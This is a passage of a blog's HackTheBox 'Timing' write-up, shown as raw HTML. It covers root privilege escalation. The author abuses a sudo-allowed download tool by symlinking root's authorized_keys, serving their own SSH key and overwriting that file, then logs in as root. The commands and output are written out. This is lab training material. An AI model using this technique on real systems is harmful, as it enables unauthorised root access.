        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>aaron@timing:~$ cat user.txt
aaa6...7b06
</pre></td></tr></tbody></table></code></div></div>

<h2 id="root-flag"><span class="me-2">ROOT FLAG</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="--privilege-escalation-root"><span class="me-2">- Privilege Escalation [Root]</span><a href="#--privilege-escalation-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I found we can run netutils as root also it exits inside /root/ folder so we can’t view that.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils

</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input &gt;&gt; 1
Enter Url: http://10.10.11.135/image.php?img=images/background.jpg
Initializing download: http://10.10.11.135/image.php?img=images/background.jpg
File size: unavailable
Opening output file image.php
Server unsupported, starting from scratch with one connection.
Starting download

[ N/A]  .......... .......... .......... .......... ..........  [ 543.9KB/s]
[ N/A]  .......... .......... .......... .......... ..........  [1039.6KB/s]
[ N/A]  .......... .......... .......... .......... ..........  [1522.1KB/s]
[ N/A]  .......... .......... .......... .......... ..........  [1980.6KB/s]
[ N/A]  ...
Connection 0 finished

Downloaded 203.4 Kilobyte in 0 seconds. (1980.56 KB/s)

aaron@timing:~$ ls -li
total 208
21220 -rw-r--r-- 1 root root  208312 Apr  8 15:41 image.php
59940 -rw-r----- 1 root aaron     33 Apr  8 04:58 user.txt

</pre></td></tr></tbody></table></code></div></div>
<p>and it’s download files in aaron home with root permission.</p>

<p>with create a symlink of /root/.ssh/authorized_keys with keys so when we get the file with same name it’s overwrite the content of authorized_keys.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Downloads/backup]
└─$ cd  /home/kali/.ssh/
                                                                                                                                           
┌──(kali㉿kali)-[~/.ssh]
└─$ python3 -m http.server 80                 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>──(kali㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa root@10.10.11.135
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr  8 15:55:42 UTC 2022

  System load:  0.04              Processes:           181
  Usage of /:   52.0% of 4.85GB   Users logged in:     1
  Memory usage: 22%               IP address for eth0: 10.10.11.135
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@timing:~# 
root@timing:~# cat root.txt 
f6ab...1af0

</pre></td></tr></tbody></table></code></div></div>

<h2 id="with-checking-the"><span class="me-2">with checking the</span><a href="#with-checking-the" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h1> Hi there 👋 Support me!</h1>
<blockquote class="prompt-tip">
  <p>Life is an echo—what you send out comes back.</p>
</blockquote>
<p><a href="https://www.paypal.com/donate?hosted_button_id=QX3V7C8BAJ84S" target="_blank"
          class="img-link shimmer"
        ><img src="/../../assets/img/DonateButtons/Paypal.png" alt="Donate" width="180" loading="lazy"></a></p>

  </div>
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4238679248235087"
     crossorigin="anonymous"></script>
<!-- Iven's blog ads -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4238679248235087"
     data-ad-slot="1267169343"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/hackthebox/">HackTheBox</a>,
          <a href="/categories/writeup/">Writeup</a>,
          <a href="/categories/medium/">Medium</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeup/"
            class="post-tag no-text-decoration"
          >Writeup</a>
        
          <a
            href="/tags/htb-medium/"
            class="post-tag no-text-decoration"
          >HTB-Medium</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HTB%20Timing%20Writeup%20-%20Iven%20Blog&url=https%3A%2F%2Fiven86.github.io%2Fposts%2FTiming%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Timing%20Writeup%20-%20Iven%20Blog&u=https%3A%2F%2Fiven86.github.io%2Fposts%2FTiming%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Fiven86.github.io%2Fposts%2FTiming%2F&text=HTB%20Timing%20Writeup%20-%20Iven%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Cursor-Editor-with-Sandbox/">How to Properly Install and Run Cursor Editor with Sandbox Enabled on Linux</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nocturnal_pwned/">HTB Nocturnal Writeup (Walkthrough)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Timing/">HTB Timing Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BoardLight/">HTB BoardLight Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Alert/">HTB Alert Writeup (Walkthrough)</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">Writeup</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-easy/">HTB-Easy</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/devops/">DevOps</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-medium/">HTB-Medium</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/troubleshooting/">Troubleshooting</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note/">Note</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/github/">GitHub</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/portswigger/">PortSwigger</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Tenet/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1583942400"
  data-df="ll"
  
>
  Mar 11, 2020
</time>

              <h4 class="pt-0 my-2">HTB Tenet Writeup</h4>
              <div class="text-muted">
                <p>INFO Machine IP = 10.10.10.223 OS       = Linux Level    = MEDIUM Points   = 30  Write the IP of the machine to your /etc/hosts file echo &quot;10.10.10.223 tenet.htb&quot; &amp;gt;&amp;gt; /etc/hosts   Scanning nma...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Ophiuchi/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1583942400"
  data-df="ll"
  
>
  Mar 11, 2020
</time>

              <h4 class="pt-0 my-2">HTB Ophiuchi Writeup</h4>
              <div class="text-muted">
                <p>INFO Machine IP = 10.10.10.227 OS       = Linux Level    = MEDIUM Points   = 30  Write the IP of the machine to your /etc/hosts file echo &quot;10.10.10.227 ophiuchi.htb&quot; &amp;gt;&amp;gt; /etc/hosts   SCANNING ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Strutted/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1743091200"
  data-df="ll"
  
>
  Mar 27, 2025
</time>

              <h4 class="pt-0 my-2">HTB Strutted Writeup (Walkthrough)</h4>
              <div class="text-muted">
                <p>Introduction  Strutted, a medium-difficulty Linux machine on HackTheBox, offers a practical exploration of real-world vulnerabilities and misconfigurations. Retired as a free instant challenge, thi...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Paper/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HTB Paper Writeup</p>
    </a>
  

  
    <a
      href="/posts/visible-error-based-sql-injection/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Visible error-based SQL injection</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/iven86">Iven Blog</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">Writeup</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-easy/">HTB-Easy</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/devops/">DevOps</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb-medium/">HTB-Medium</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/troubleshooting/">Troubleshooting</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note/">Note</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/github/">GitHub</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/portswigger/">PortSwigger</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

